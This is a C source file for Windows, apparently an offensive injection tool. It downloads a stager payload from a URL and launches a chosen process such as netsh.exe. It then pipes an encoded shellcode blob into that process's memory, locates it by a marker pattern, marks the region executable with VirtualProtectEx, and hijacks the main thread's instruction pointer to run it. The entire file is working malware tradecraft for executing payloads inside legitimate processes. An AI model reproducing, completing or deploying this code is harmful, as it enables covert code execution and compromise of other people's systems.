#include <stdio.h>
#include <Windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <wininet.h>
#include "InjectHelp.h"
#include "PipeExchange.h"

#pragma comment(lib, "wininet.lib")
#define PAYLOAD_URL L"http://localhost:8081/stager.bin"

BOOL FetchFileFromUrl(IN LPCWSTR szFileDownloadUrl, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize)
{
    *pdwFileSize = 0;
    *ppFileBuffer = NULL;

    HINTERNET hInternet = NULL,
        hInternetFile = NULL;
    DWORD dwTmpBytesRead = 0x00,
        dwFileSize = 0x00;
    PBYTE pFileBuffer = NULL,
        pTmpPtr = NULL;

    if (!ppFileBuffer || !pdwFileSize)
        return FALSE;

    if (!(hInternet = InternetOpenW(NULL, 0x00, NULL, NULL, 0x00))) {
        goto _END_OF_FUNC;
    }

    if (!(hInternetFile = InternetOpenUrlW(hInternet, szFileDownloadUrl, NULL, 0x00, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0x00))) {
        goto _END_OF_FUNC;
    }

    if (!(pTmpPtr = LocalAlloc(LPTR, 1024))) {
        goto _END_OF_FUNC;
    }

    while (TRUE) {
        if (!InternetReadFile(hInternetFile, pTmpPtr, 1024, &dwTmpBytesRead)) {
            goto _END_OF_FUNC;
        }

        dwFileSize += dwTmpBytesRead;

        if (!pFileBuffer)
            pFileBuffer = LocalAlloc(LPTR, dwTmpBytesRead);
        else
            pFileBuffer = LocalReAlloc(pFileBuffer, dwFileSize, LMEM_MOVEABLE | LMEM_ZEROINIT); // Reallocate size to the total size of dwFileSize

        if (!pFileBuffer)
        {
            goto _END_OF_FUNC;
        }

        memcpy(pFileBuffer + (dwFileSize - dwTmpBytesRead), pTmpPtr, dwTmpBytesRead); // Append temp buffer onto the end of real buffer

        memset(pTmpPtr, 0x00, dwTmpBytesRead);

        if (dwTmpBytesRead == 0) {
            break;
        }
    }

    *ppFileBuffer = pFileBuffer;
    *pdwFileSize = dwFileSize;
_END_OF_FUNC:
    if (pTmpPtr)
        LocalFree(pTmpPtr);
    if ((!*ppFileBuffer || !*pdwFileSize) && pFileBuffer)

        LocalFree(pFileBuffer);
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);
    if (hInternet)
        InternetCloseHandle(hInternet);
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

    return (*ppFileBuffer != NULL && *pdwFileSize != 0x00) ? TRUE : FALSE;
}

int main(int argc, char* argv[])
{
    /* 1. Ensure a command was passed via command line arguments */
    if (argc < 2) {
        printf("Usage: %s <executable_path>\n", argv[0]);
        printf("Example: %s C:\\Windows\\System32\\netsh.exe\n", argv[0]);
        return 1;
    }

    char* procName = argv[1];

    /*
     * Convert the narrow string to a wide string (wchar_t)
     * required by CreateProcessW.
     */
    int wchars_num = MultiByteToWideChar(CP_ACP, 0, procName, -1, NULL, 0);

    if (wchars_num == 0) 
    {
        printf("MultiByteToWideChar failed. Error: %lu\n",
            GetLastError());
        return 1;
    }

    wchar_t* childPath = malloc(wchars_num * sizeof(wchar_t));

    if (childPath == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        return 1;
    }

    if (MultiByteToWideChar(CP_ACP, 0, procName, -1, childPath, wchars_num) == 0) 
    {
        printf("MultiByteToWideChar failed. Error: %lu\n",
            GetLastError());

        free(childPath);
        return 1;
    }
    
    printf("[#] Getting Payload\n");
    PBYTE pPayloadFileBuffer = NULL;
    DWORD dwPayloadFileSize = 0;

    if (!FetchFileFromUrl(PAYLOAD_URL, &pPayloadFileBuffer, &dwPayloadFileSize))
    {
        return 4;
    }
    

    wprintf(L"Launching: %ls\n", childPath);

    HANDLE hChildStd_IN_Rd = NULL;
    HANDLE hChildStd_IN_Wr = NULL;
    HANDLE hChildStd_OUT_Rd = NULL;
    HANDLE hChildStd_OUT_Wr = NULL;

    SECURITY_ATTRIBUTES saAttr;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0))
    {
        printf("[!] Failed To Create STDOUT Pipe\n");
        return 1;
    }

    if (!CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0))
    {
        printf("[!] Failed To Create STDIN Pipe\n");
        return 2;
    }

    SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.hStdError = hChildStd_OUT_Wr;
    si.hStdOutput = hChildStd_OUT_Wr;
    si.hStdInput = hChildStd_IN_Rd;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    if (!CreateProcess(NULL, childPath, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        PrintLastError("CreateProcess\n");
        return 3;
    }

    // Close child-side pipe handles in parent process
    CloseHandle(hChildStd_OUT_Wr);
    CloseHandle(hChildStd_IN_Rd);

    // Give time to init
    Sleep(200);
    unsigned char rawData[368] = {
        0x61, 0x61, 0x61, 0x62, 0x62, 0x62, 0x63, 0x63, 0x63, 0x64, 0x64, 0x64,
        0x65, 0x65, 0x65, 0x66, 0x66, 0x66, 0x66, 0x67, 0x67, 0x67, 0x6A, 0x6A,
        0x6A, 0x48, 0xB8, 0x30, 0xAC, 0x10, 0x28, 0x03, 0xD6, 0x03, 0x02, 0xDB,
        0xCA, 0x54, 0x4D, 0x31, 0xDB, 0x5B, 0x41, 0xB3, 0x23, 0x66, 0x81, 0xE3,
        0x10, 0xF9, 0x48, 0x0F, 0xAE, 0x03, 0x48, 0x83, 0xC3, 0x08, 0x48, 0x8B,
        0x13, 0x49, 0xFF, 0xCB, 0x4A, 0x31, 0x44, 0xDA, 0x27, 0x4D, 0x85, 0xDB,
        0x75, 0xF3, 0xCC, 0xE4, 0x93, 0xCC, 0xF3, 0x3E, 0xC3, 0x02, 0x30, 0xAC,
        0x51, 0x79, 0x42, 0x86, 0x51, 0x53, 0x66, 0xE4, 0x21, 0xFA, 0x66, 0x9E,
        0x88, 0x50, 0x50, 0xE4, 0x9B, 0x7A, 0x1B, 0x9E, 0x88, 0x50, 0x10, 0xE4,
        0x9B, 0x5A, 0x53, 0x9E, 0x0C, 0xB5, 0x7A, 0xE6, 0x5D,
    };

    /*DWORD combinedSize = sizeof(rawData) + dwPayloadFileSize;
    uint8_t* combinedData = (uint8_t*)malloc(combinedSize);

    if (!combinedData)
    {
        printf("[!] Memory allocation failed\n");
        LocalFree(pPayloadFileBuffer);
        return 10;
    }

    memcpy(combinedData, rawData, sizeof(rawData));
    memcpy(combinedData + sizeof(rawData), pPayloadFileBuffer, dwPayloadFileSize);

    printf("[*] combinedData size: %lu bytes\n", combinedSize);
    */
    printf("[#] Writing To Pipe\n");
    WriteToPipeBin(hChildStd_IN_Wr, rawData, sizeof(rawData));

    // Give the process time to execute and reply
    Sleep(200);
    /*DWORD outLen = 0;
    printf("--- Output After Command ---\n%s\n", ReadFromPipe(hChildStd_OUT_Rd,&outLen));
    free(outLen);*/
    uint8_t rawDataPattern[] = {
    0x61, 0x61, 0x61, 0x62, 0x62, 0x62, 0x63, 0x63, 0x63,
    0x64, 0x64, 0x64, 0x65, 0x65, 0x65, 0x66, 0x66, 0x66,
    0x66, 0x67, 0x67, 0x67, 0x6A, 0x6A, 0x6A
    };
    // Looking for pattern in remote process
    printf("[#]Running\n");
    uintptr_t foundAddr = 0;
    bool result = FindPatternInRemoteProcess(pi.hProcess, rawDataPattern, sizeof(rawDataPattern), &foundAddr);
    printf("[#]Here\n");
    if (!result)
    {
        printf("[!] Pattern Not Found In Remote Process Memory Now. Wait And Search Again\n");
        Sleep(2000);
        result = FindPatternInRemoteProcess(pi.hProcess, rawDataPattern, sizeof(rawDataPattern), &foundAddr);
    }

    if (result)
    {
        printf("[+] Found At Remote Address: 0x%p\n", (unsigned long long)foundAddr);

        SIZE_T size = sizeof(rawData);
        DWORD newProtect = PAGE_EXECUTE_READWRITE;

        MEMORY_BASIC_INFORMATION mbi = { 0 };

        if (VirtualQueryEx(pi.hProcess, (LPCVOID)foundAddr, &mbi, sizeof(mbi)))
        {
            printf("[+] Region @ %p: base=%p size=0x%zX state=0x%1X protect = 0x%1X type=0x%1X\n", (unsigned long long)foundAddr, mbi.BaseAddress, mbi.RegionSize, mbi.State, mbi.Protect, mbi.Type);
        }
        else
        {
            PrintLastError("VirtualQueryEx (continuing anyway)");
        }

        uint8_t* buf = malloc(size);

        if (buf == NULL)
        {
            fprintf(stderr, "Memory Allocation Failed.\n");
            CloseHandle(pi.hProcess);
            return 5;
        }

        SIZE_T got = 0;

        if (!ReadProcessMemory(pi.hProcess, (LPCVOID)foundAddr, buf, size, &got))
        {
            PrintLastError("ReadProcessMemory");
            free(buf);
            CloseHandle(pi.hProcess);
            return 6;
        }

        printf("[+] Read %zu/%zu bytes from 0x%11X\n\n", (size_t)got, (size_t)size, (unsigned long long)foundAddr);

        if (newProtect != 0)
        {
            DWORD oldProtect = 0;
            if (!VirtualProtectEx(pi.hProcess, (LPVOID)foundAddr, size, newProtect, &oldProtect))
            {
                PrintLastError("VirtualProtectEx");
                CloseHandle(pi.hProcess);
                return 7;
            }

            printf("[+] VirtualProtectEx OK: 0x%llX size=%zu old=0x%1X new=0x%1X\n\n", (unsigned long long)foundAddr, (size_t)size, oldProtect, newProtect);
        }
        else
        {
            printf("[i] new_protect == 0, skipping VirtualProtectEx and RIP hijack\n");
            CloseHandle(pi.hProcess);
            return 8;
        }

        DWORD mainTid = GetMainThreadId(pi.dwProcessId);

        if (!HijackThreadRip(mainTid, (foundAddr + 0x19)))
        {
            printf("[!] Failed To Hijack Thread %lu\n", mainTid);
            CloseHandle(pi.hProcess);
            return 9;
        }

        printf("[+] Done. Main thread now executing at 0x%llX\n", (unsigned long long)foundAddr);
    }
    else {
        printf("Pattern Not Found.\n");
    }

    printf("Input to exit and trigger child thread\n");
    getchar();

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hChildStd_OUT_Rd);
    CloseHandle(hChildStd_IN_Wr);

    return 0;
}